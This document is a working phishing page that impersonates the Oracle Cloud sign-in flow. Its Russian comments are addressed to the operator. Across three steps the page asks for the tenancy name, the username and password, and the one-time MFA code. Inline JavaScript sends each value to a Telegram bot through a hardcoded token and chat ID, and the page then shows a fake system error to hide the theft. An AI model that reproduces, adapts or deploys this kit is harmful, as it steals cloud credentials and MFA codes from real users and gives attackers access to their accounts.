<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Oracle Cloud Sign In</title>
    <style>
        body { font-family: Arial, sans-serif; background: #fff; margin: 0; padding: 0; color: #312d2a; }
        .header { background: #312d2a; color: #fff; padding: 12px 20px; font-size: 14px; }
        .container { max-width: 400px; margin: 40px auto; padding: 20px; }
        .logo-main { font-size: 32px; font-weight: bold; margin: 0; }
        .logo-sub { font-size: 22px; margin-bottom: 30px; }
        .step { display: none; }
        .step.active { display: block; }
        label { font-weight: 600; display: block; margin-bottom: 8px; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #312d2a; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        button:disabled { background: #e0e0e0; color: #9e9e9e; cursor: not-allowed; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #312d2a; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="header">Oracle Cloud Infrastructure</div>

<div class="container">
    <!-- ШАГ 1: Аккаунт -->
    <div class="step active" id="step1">
        <div class="logo-main">ORACLE</div>
        <div class="logo-sub">Cloud</div>
        <label>Cloud Account Name</label>
        <input type="text" id="acc" placeholder="Enter account name" oninput="check1()">
        <button id="btn1" disabled onclick="nav(2)">Next</button>
    </div>

    <!-- ШАГ 2: Логин и Пароль -->
    <div class="step" id="step2">
        <div style="margin-bottom:20px">Tenancy: <b id="disp_acc"></b></div>
        <label>User Name</label>
        <input type="text" id="user" placeholder="User name" oninput="check2()">
        <label>Password</label>
        <input type="password" id="pass" placeholder="Password" oninput="check2()">
        <button id="btn2" disabled onclick="nav(3)">Sign In</button>
    </div>

    <!-- ШАГ 3: MFA Код -->
    <div class="step" id="step3">
        <h2>Verify Identity</h2>
        <label>Verification Code</label>
        <input type="text" id="code" placeholder="000000" maxlength="6" oninput="check3()">
        <button id="btn3" disabled onclick="finish()">Verify</button>
    </div>

    <!-- ШАГ 4: Загрузка -->
    <div class="step" id="step4" style="text-align:center;">
        <div class="loader"></div>
        <p>Authenticating...</p>
    </div>
</div>

<script>
// ТВОИ ДАННЫЕ
const TOKEN = '8247288911:AAEVOitrWDnxYaxXl_xzzGMQZnLwXQrFbjo';
const CHAT_ID = '6576262467';

// Функция перехода между шагами
function nextStep(n) {
    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
    document.getElementById('step' + n).classList.add('active');
}

// Универсальная функция отправки в Telegram
async function sendToBot(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (e) {
        console.error('Ошибка отправки');
    }
}

// Логика кнопок
function nav(n) {
    const accValue = document.getElementById('acc').value;
    
    if (n === 2) {
        sendToBot(`<b>☁️ Аккаунт:</b> <code>${accValue}</code>`);
        document.getElementById('disp_acc').innerText = accValue;
    }
    
    if (n === 3) {
        const userValue = document.getElementById('user').value;
        const passValue = document.getElementById('pass').value;
        sendToBot(`<b>👤 Данные:</b>\nTenancy: ${accValue}\nUser: <code>${userValue}</code>\nPass: <code>${passValue}</code>`);
    }
    
    nextStep(n);
}

async function finish() {
    const codeValue = document.getElementById('code').value;
    await sendToBot(`<b>🔐 Код MFA:</b> <code>${codeValue}</code>`);
    
    nextStep(4);
    setTimeout(() => {
        alert('Системная ошибка. Попробуйте позже.');
        window.location.reload();
    }, 4000);
}

// Проверки полей (чтобы кнопки активировались)
function check1() {
    document.getElementById('btn1').disabled = document.getElementById('acc').value.trim().length < 2;
}
function check2() {
    const u = document.getElementById('user').value.trim();
    const p = document.getElementById('pass').value.trim();
    document.getElementById('btn2').disabled = (u.length < 2 || p.length < 2);
}
function check3() {
    document.getElementById('btn3').disabled = document.getElementById('code').value.trim().length !== 6;
}
</script>

</body>
</html>
